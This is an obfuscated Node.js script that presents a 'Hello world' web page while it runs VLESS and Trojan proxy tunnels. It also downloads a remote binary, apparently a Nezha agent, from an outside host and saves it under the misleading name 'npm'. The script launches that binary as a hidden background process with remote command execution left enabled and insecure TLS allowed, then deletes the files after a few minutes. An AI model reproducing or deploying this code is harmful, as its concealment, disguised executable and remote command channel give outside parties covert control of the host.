const _0xd3bbc3=_0x50c4;(function(_0x42a67f,_0x5de919){const _0x21fdbf=_0x50c4,_0x10f5b5=_0x42a67f();while(!![]){try{const _0x45c7e0=parseInt(_0x21fdbf(0x14f))/0x1+-parseInt(_0x21fdbf(0x124))/0x2*(-parseInt(_0x21fdbf(0x115))/0x3)+-parseInt(_0x21fdbf(0x106))/0x4*(-parseInt(_0x21fdbf(0xf8))/0x5)+-parseInt(_0x21fdbf(0x11c))/0x6*(parseInt(_0x21fdbf(0x101))/0x7)+-parseInt(_0x21fdbf(0x15a))/0x8*(-parseInt(_0x21fdbf(0xe9))/0x9)+-parseInt(_0x21fdbf(0x12d))/0xa+parseInt(_0x21fdbf(0x153))/0xb;if(_0x45c7e0===_0x5de919)break;else _0x10f5b5['push'](_0x10f5b5['shift']());}catch(_0x405ae1){_0x10f5b5['push'](_0x10f5b5['shift']());}}}(_0x30b7,0x295cd));const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0xd3bbc3(0x13b)),net=require(_0xd3bbc3(0x113)),path=require(_0xd3bbc3(0xe2)),crypto=require(_0xd3bbc3(0x158)),{Buffer}=require(_0xd3bbc3(0x13c)),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0xd3bbc3(0x151)][_0xd3bbc3(0xef)]||_0xd3bbc3(0x12e),NEZHA_SERVER=process[_0xd3bbc3(0x151)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0xd3bbc3(0x151)][_0xd3bbc3(0xe3)]||'',NEZHA_KEY=process[_0xd3bbc3(0x151)][_0xd3bbc3(0x103)]||'',DOMAIN=process[_0xd3bbc3(0x151)]['DOMAIN']||_0xd3bbc3(0x14e),AUTO_ACCESS=process['env'][_0xd3bbc3(0x13e)]||!![],WSPATH=process['env'][_0xd3bbc3(0x111)]||UUID['slice'](0x0,0x8),SUB_PATH=process[_0xd3bbc3(0x151)]['SUB_PATH']||_0xd3bbc3(0x131),NAME=process[_0xd3bbc3(0x151)][_0xd3bbc3(0x137)]||_0xd3bbc3(0x116),PORT=process['env']['PORT']||0x1eb4;function _0x50c4(_0x4f1eb1,_0x363266){const _0x30b724=_0x30b7();return _0x50c4=function(_0x50c423,_0x16739f){_0x50c423=_0x50c423-0xdc;let _0x46a7d4=_0x30b724[_0x50c423];return _0x46a7d4;},_0x50c4(_0x4f1eb1,_0x363266);}let ISP='';const GetISP=async()=>{const _0x5dbd65=_0xd3bbc3;try{const _0x421d0c=await axios[_0x5dbd65(0x134)]('https://speed.cloudflare.com/meta'),_0x3c95e7=_0x421d0c[_0x5dbd65(0x118)];ISP=(_0x3c95e7[_0x5dbd65(0x12f)]+'-'+_0x3c95e7[_0x5dbd65(0xf9)])[_0x5dbd65(0xff)](/ /g,'_');}catch(_0xd63c87){ISP='Unknown';}};GetISP();const httpServer=http['createServer']((_0x496bd3,_0x841fc3)=>{const _0x3b15bd=_0xd3bbc3;if(_0x496bd3[_0x3b15bd(0xe4)]==='/'){const _0x189cc1=path['join'](__dirname,'index.html');fs[_0x3b15bd(0x112)](_0x189cc1,_0x3b15bd(0x150),(_0x338f97,_0x11ec7a)=>{const _0x58db30=_0x3b15bd;if(_0x338f97){_0x841fc3['writeHead'](0xc8,{'Content-Type':'text/html'}),_0x841fc3[_0x58db30(0x10f)]('Hello\x20world!');return;}_0x841fc3[_0x58db30(0x128)](0xc8,{'Content-Type':_0x58db30(0xf3)}),_0x841fc3[_0x58db30(0x10f)](_0x11ec7a);});return;}else{if(_0x496bd3['url']==='/'+SUB_PATH){const _0x2beb30=_0x3b15bd(0x140)+UUID+'@'+DOMAIN+_0x3b15bd(0xfa)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x3b15bd(0x119)+WSPATH+'#'+NAME+'-'+ISP,_0x318bc1=_0x3b15bd(0x14d)+UUID+'@'+DOMAIN+_0x3b15bd(0xed)+DOMAIN+_0x3b15bd(0x141)+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x411fc0=_0x2beb30+'\x0a'+_0x318bc1,_0x3897dd=Buffer[_0x3b15bd(0xfe)](_0x411fc0)[_0x3b15bd(0x143)](_0x3b15bd(0xe8));_0x841fc3[_0x3b15bd(0x128)](0xc8,{'Content-Type':_0x3b15bd(0xde)}),_0x841fc3[_0x3b15bd(0x10f)](_0x3897dd+'\x0a');}else _0x841fc3['writeHead'](0x194,{'Content-Type':_0x3b15bd(0xde)}),_0x841fc3[_0x3b15bd(0x10f)](_0x3b15bd(0x138));}}),wss=new WebSocket[(_0xd3bbc3(0x122))]({'server':httpServer}),uuid=UUID[_0xd3bbc3(0xff)](/-/g,''),DNS_SERVERS=[_0xd3bbc3(0xe6),_0xd3bbc3(0x144)];function resolveHost(_0x55162b){return new Promise((_0x3b771a,_0x1db02b)=>{const _0x2cc6d2=_0x50c4;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x2cc6d2(0x11e)](_0x55162b)){_0x3b771a(_0x55162b);return;}let _0x184266=0x0;function _0x1f7c4c(){const _0x1fe318=_0x2cc6d2;if(_0x184266>=DNS_SERVERS[_0x1fe318(0x120)]){_0x1db02b(new Error('Failed\x20to\x20resolve\x20'+_0x55162b+_0x1fe318(0x146)));return;}const _0x2a0ce0=DNS_SERVERS[_0x184266];_0x184266++;const _0x177412=_0x1fe318(0x157)+encodeURIComponent(_0x55162b)+_0x1fe318(0xf4);axios[_0x1fe318(0x134)](_0x177412,{'timeout':0x1388,'headers':{'Accept':_0x1fe318(0xe1)}})[_0x1fe318(0x149)](_0x13c2b7=>{const _0x614690=_0x1fe318,_0x471e8c=_0x13c2b7[_0x614690(0x118)];if(_0x471e8c[_0x614690(0x145)]===0x0&&_0x471e8c[_0x614690(0xf0)]&&_0x471e8c['Answer']['length']>0x0){const _0x16e395=_0x471e8c[_0x614690(0xf0)][_0x614690(0x154)](_0x1e64f5=>_0x1e64f5['type']===0x1);if(_0x16e395){_0x3b771a(_0x16e395[_0x614690(0x118)]);return;}}_0x1f7c4c();})[_0x1fe318(0x159)](_0x4fd190=>{_0x1f7c4c();});}_0x1f7c4c();});}function handleVlessConnection(_0x4f16e3,_0x2f4033){const _0x608bcd=_0xd3bbc3,[_0x51c876]=_0x2f4033,_0x9a4cd0=_0x2f4033[_0x608bcd(0xe5)](0x1,0x11);if(!_0x9a4cd0[_0x608bcd(0x148)]((_0x4ffe4e,_0x53a3c1)=>_0x4ffe4e==parseInt(uuid[_0x608bcd(0xdc)](_0x53a3c1*0x2,0x2),0x10)))return![];let _0x35e2a2=_0x2f4033[_0x608bcd(0xe5)](0x11,0x12)[_0x608bcd(0x133)]()+0x13;const _0x2b3d90=_0x2f4033[_0x608bcd(0xe5)](_0x35e2a2,_0x35e2a2+=0x2)[_0x608bcd(0x11d)](0x0),_0x274783=_0x2f4033['slice'](_0x35e2a2,_0x35e2a2+=0x1)[_0x608bcd(0x133)](),_0x508d92=_0x274783==0x1?_0x2f4033[_0x608bcd(0xe5)](_0x35e2a2,_0x35e2a2+=0x4)[_0x608bcd(0x10b)]('.'):_0x274783==0x2?new TextDecoder()[_0x608bcd(0x11a)](_0x2f4033[_0x608bcd(0xe5)](_0x35e2a2+0x1,_0x35e2a2+=0x1+_0x2f4033['slice'](_0x35e2a2,_0x35e2a2+0x1)[_0x608bcd(0x133)]())):_0x274783==0x3?_0x2f4033[_0x608bcd(0xe5)](_0x35e2a2,_0x35e2a2+=0x10)['reduce']((_0x1faad0,_0x554c32,_0x1fbcfa,_0x5582e0)=>_0x1fbcfa%0x2?_0x1faad0[_0x608bcd(0x135)](_0x5582e0[_0x608bcd(0xe5)](_0x1fbcfa-0x1,_0x1fbcfa+0x1)):_0x1faad0,[])[_0x608bcd(0x125)](_0x54ab5d=>_0x54ab5d[_0x608bcd(0x11d)](0x0)[_0x608bcd(0x143)](0x10))['join'](':'):'';_0x4f16e3[_0x608bcd(0x13f)](new Uint8Array([_0x51c876,0x0]));const _0x1bd256=createWebSocketStream(_0x4f16e3);return resolveHost(_0x508d92)[_0x608bcd(0x149)](_0x421546=>{const _0x525567=_0x608bcd;net[_0x525567(0x10a)]({'host':_0x421546,'port':_0x2b3d90},function(){const _0x26b9f4=_0x525567;this[_0x26b9f4(0x156)](_0x2f4033[_0x26b9f4(0xe5)](_0x35e2a2)),_0x1bd256['on'](_0x26b9f4(0x12a),()=>{})[_0x26b9f4(0x110)](this)['on'](_0x26b9f4(0x12a),()=>{})[_0x26b9f4(0x110)](_0x1bd256);})['on']('error',()=>{});})[_0x608bcd(0x159)](_0x3156d1=>{const _0x5b2b9b=_0x608bcd;net[_0x5b2b9b(0x10a)]({'host':_0x508d92,'port':_0x2b3d90},function(){const _0x3acf52=_0x5b2b9b;this[_0x3acf52(0x156)](_0x2f4033[_0x3acf52(0xe5)](_0x35e2a2)),_0x1bd256['on'](_0x3acf52(0x12a),()=>{})[_0x3acf52(0x110)](this)['on'](_0x3acf52(0x12a),()=>{})['pipe'](_0x1bd256);})['on'](_0x5b2b9b(0x12a),()=>{});}),!![];}function _0x30b7(){const _0x2cfead=['\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','text/html','&type=A','2083','\x20-p\x20','update','33280CaYaia','asOrganization',':443?encryption=none&security=tls&sni=','createWriteStream','connection','Server\x20is\x20running\x20on\x20port\x20','from','replace','digest','2265557qXQket','https://oooo.serv00.net/add-url','NEZHA_KEY','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','npm\x20download\x20successfully','144vbvbFb','https://amd64.ssss.nyc.mn/v1','chmod\x20+x\x20npm','split','connect','join','npm','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','setsid\x20nohup\x20./npm\x20-s\x20','end','pipe','WSPATH','readFile','net','reduce','3jhtpyG','Hug','npm\x20is\x20already\x20running,\x20skip\x20running...','data','&path=%2F','decode','https://','6ISbqXc','readUInt16BE','test','aarch64','length','utf-8','Server','arm64','266382yefLps','map','--tls','trim','writeHead','443','error','npm\x20running\x20error:','createHash','2654460bNFWQB','a99be468-961d-4e28-94f7-0eae5a57b3cb','country','https://amd64.ssss.nyc.mn/agent','sub','sha224','readUInt8','get','concat','true','NAME','Not\x20Found\x0a','Automatic\x20Access\x20Task\x20added\x20successfully','config.yaml','axios','buffer','false','AUTO_ACCESS','send','vless://','&fp=chrome&type=ws&host=','2096','toString','1.1.1.1','Status','\x20with\x20all\x20DNS\x20servers','writeFileSync','every','then','https://arm64.ssss.nyc.mn/v1','unlink','error:\x20','trojan://','1234.abc.com','151243NqsNnI','utf8','env','hex','1464408CubQQA','find','log','write','https://dns.google/resolve?name=','crypto','catch','90080jrnhNh','substr','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','text/plain','listen','arch','application/dns-json','path','NEZHA_PORT','url','slice','8.8.4.4','includes','base64','81TzmOkd','client_secret:\x20','pop','close',':443?security=tls&sni=','finish','UUID','Answer','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'];_0x30b7=function(){return _0x2cfead;};return _0x30b7();}function handleTrojanConnection(_0x44671b,_0x39da70){const _0x745072=_0xd3bbc3;try{if(_0x39da70[_0x745072(0x120)]<0x3a)return![];const _0x583666=_0x39da70['slice'](0x0,0x38)['toString'](),_0x1aaa63=[UUID];let _0x55b944=null;for(const _0x1e0add of _0x1aaa63){const _0x553f20=crypto[_0x745072(0x12c)](_0x745072(0x132))[_0x745072(0xf7)](_0x1e0add)[_0x745072(0x100)](_0x745072(0x152));if(_0x553f20===_0x583666){_0x55b944=_0x1e0add;break;}}if(!_0x55b944)return![];let _0x5996b6=0x38;_0x39da70[_0x5996b6]===0xd&&_0x39da70[_0x5996b6+0x1]===0xa&&(_0x5996b6+=0x2);const _0x461f0d=_0x39da70[_0x5996b6];if(_0x461f0d!==0x1)return![];_0x5996b6+=0x1;const _0x6dbab1=_0x39da70[_0x5996b6];_0x5996b6+=0x1;let _0x5cc530,_0xf3c5ec;if(_0x6dbab1===0x1)_0x5cc530=_0x39da70[_0x745072(0xe5)](_0x5996b6,_0x5996b6+0x4)['join']('.'),_0x5996b6+=0x4;else{if(_0x6dbab1===0x3){const _0x2456af=_0x39da70[_0x5996b6];_0x5996b6+=0x1,_0x5cc530=_0x39da70[_0x745072(0xe5)](_0x5996b6,_0x5996b6+_0x2456af)[_0x745072(0x143)](),_0x5996b6+=_0x2456af;}else{if(_0x6dbab1===0x4)_0x5cc530=_0x39da70[_0x745072(0xe5)](_0x5996b6,_0x5996b6+0x10)[_0x745072(0x114)]((_0x30330b,_0x54dcac,_0x468c10,_0x3dc044)=>_0x468c10%0x2?_0x30330b[_0x745072(0x135)](_0x3dc044[_0x745072(0xe5)](_0x468c10-0x1,_0x468c10+0x1)):_0x30330b,[])['map'](_0x1290f4=>_0x1290f4[_0x745072(0x11d)](0x0)['toString'](0x10))[_0x745072(0x10b)](':'),_0x5996b6+=0x10;else return![];}}_0xf3c5ec=_0x39da70[_0x745072(0x11d)](_0x5996b6),_0x5996b6+=0x2;_0x5996b6<_0x39da70[_0x745072(0x120)]&&_0x39da70[_0x5996b6]===0xd&&_0x39da70[_0x5996b6+0x1]===0xa&&(_0x5996b6+=0x2);const _0x2bc7d5=createWebSocketStream(_0x44671b);return resolveHost(_0x5cc530)[_0x745072(0x149)](_0x48349e=>{const _0x55d2e5=_0x745072;net[_0x55d2e5(0x10a)]({'host':_0x48349e,'port':_0xf3c5ec},function(){const _0xd28faa=_0x55d2e5;_0x5996b6<_0x39da70['length']&&this['write'](_0x39da70[_0xd28faa(0xe5)](_0x5996b6)),_0x2bc7d5['on'](_0xd28faa(0x12a),()=>{})[_0xd28faa(0x110)](this)['on'](_0xd28faa(0x12a),()=>{})[_0xd28faa(0x110)](_0x2bc7d5);})['on']('error',()=>{});})[_0x745072(0x159)](_0x2a5164=>{const _0x28555c=_0x745072;net['connect']({'host':_0x5cc530,'port':_0xf3c5ec},function(){const _0x2d9697=_0x50c4;_0x5996b6<_0x39da70['length']&&this['write'](_0x39da70[_0x2d9697(0xe5)](_0x5996b6)),_0x2bc7d5['on'](_0x2d9697(0x12a),()=>{})[_0x2d9697(0x110)](this)['on']('error',()=>{})[_0x2d9697(0x110)](_0x2bc7d5);})['on'](_0x28555c(0x12a),()=>{});}),!![];}catch(_0x27ee3f){return![];}}wss['on'](_0xd3bbc3(0xfc),(_0x4fc1bb,_0x27173e)=>{const _0x1560fa=_0xd3bbc3,_0x2372b2=_0x27173e[_0x1560fa(0xe4)]||'';_0x4fc1bb['once']('message',_0x510876=>{const _0x11b520=_0x1560fa;if(_0x510876[_0x11b520(0x120)]>0x11&&_0x510876[0x0]===0x0){const _0x984fd0=_0x510876['slice'](0x1,0x11),_0x10259b=_0x984fd0[_0x11b520(0x148)]((_0x57928e,_0x5b757f)=>_0x57928e==parseInt(uuid[_0x11b520(0xdc)](_0x5b757f*0x2,0x2),0x10));if(_0x10259b){!handleVlessConnection(_0x4fc1bb,_0x510876)&&_0x4fc1bb[_0x11b520(0xec)]();return;}}!handleTrojanConnection(_0x4fc1bb,_0x510876)&&_0x4fc1bb['close']();})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x55e3ad=_0xd3bbc3,_0x40b94a=os[_0x55e3ad(0xe0)]();return _0x40b94a==='arm'||_0x40b94a===_0x55e3ad(0x123)||_0x40b94a===_0x55e3ad(0x11f)?!NEZHA_PORT?_0x55e3ad(0x14a):'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?_0x55e3ad(0x107):_0x55e3ad(0x130);},downloadFile=async()=>{const _0x1af657=_0xd3bbc3;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x21a763=getDownloadUrl(),_0x216aa6=await axios({'method':_0x1af657(0x134),'url':_0x21a763,'responseType':'stream'}),_0x279003=fs[_0x1af657(0xfb)](_0x1af657(0x10c));return _0x216aa6['data'][_0x1af657(0x110)](_0x279003),new Promise((_0x36783b,_0x41929e)=>{const _0x57a31a=_0x1af657;_0x279003['on'](_0x57a31a(0xee),()=>{const _0x1d6563=_0x57a31a;console[_0x1d6563(0x155)](_0x1d6563(0x105)),exec(_0x1d6563(0x108),_0x3e7052=>{if(_0x3e7052)_0x41929e(_0x3e7052);_0x36783b();});}),_0x279003['on'](_0x57a31a(0x12a),_0x41929e);});}catch(_0x42539b){throw _0x42539b;}},runnz=async()=>{const _0x27e01d=_0xd3bbc3;try{const _0xa9ff9d=execSync(_0x27e01d(0x104),{'encoding':_0x27e01d(0x121)});if(_0xa9ff9d[_0x27e01d(0x127)]()!==''){console[_0x27e01d(0x155)](_0x27e01d(0x117));return;}}catch(_0x4b3487){}await downloadFile();let _0x4fbef0='',_0x20a37f=[_0x27e01d(0x129),'8443',_0x27e01d(0x142),'2087',_0x27e01d(0xf5),'2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x4e78c3=_0x20a37f['includes'](NEZHA_PORT)?_0x27e01d(0x126):'';_0x4fbef0=_0x27e01d(0x10e)+NEZHA_SERVER+':'+NEZHA_PORT+_0x27e01d(0xf6)+NEZHA_KEY+'\x20'+_0x4e78c3+_0x27e01d(0xdd);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x3da103=NEZHA_SERVER[_0x27e01d(0xe7)](':')?NEZHA_SERVER[_0x27e01d(0x109)](':')[_0x27e01d(0xeb)]():'',_0x4c89c6=_0x20a37f['includes'](_0x3da103)?_0x27e01d(0x136):_0x27e01d(0x13d),_0x595114=_0x27e01d(0xea)+NEZHA_KEY+_0x27e01d(0x10d)+NEZHA_SERVER+_0x27e01d(0xf1)+_0x4c89c6+_0x27e01d(0xf2)+UUID;fs[_0x27e01d(0x147)](_0x27e01d(0x13a),_0x595114);}_0x4fbef0='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console[_0x27e01d(0x155)]('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x4fbef0,{'shell':'/bin/bash'},_0x1295dc=>{const _0xbcb8b7=_0x27e01d;if(_0x1295dc)console[_0xbcb8b7(0x12a)](_0xbcb8b7(0x12b),_0x1295dc);else console[_0xbcb8b7(0x155)]('npm\x20is\x20running');});}catch(_0x39cc6c){console[_0x27e01d(0x12a)](_0x27e01d(0x14c)+_0x39cc6c);}};async function addAccessTask(){const _0x2f8a09=_0xd3bbc3;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x1d365b=_0x2f8a09(0x11b)+DOMAIN;try{const _0x4b98fe=await axios['post'](_0x2f8a09(0x102),{'url':_0x1d365b},{'headers':{'Content-Type':'application/json'}});console[_0x2f8a09(0x155)](_0x2f8a09(0x139));}catch(_0x372381){}}const delFiles=()=>{const _0x5c293=_0xd3bbc3;fs[_0x5c293(0x14b)]('npm',()=>{}),fs[_0x5c293(0x14b)](_0x5c293(0x13a),()=>{});};httpServer[_0xd3bbc3(0xdf)](PORT,()=>{const _0x1153b6=_0xd3bbc3;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x1153b6(0xfd)+PORT);});
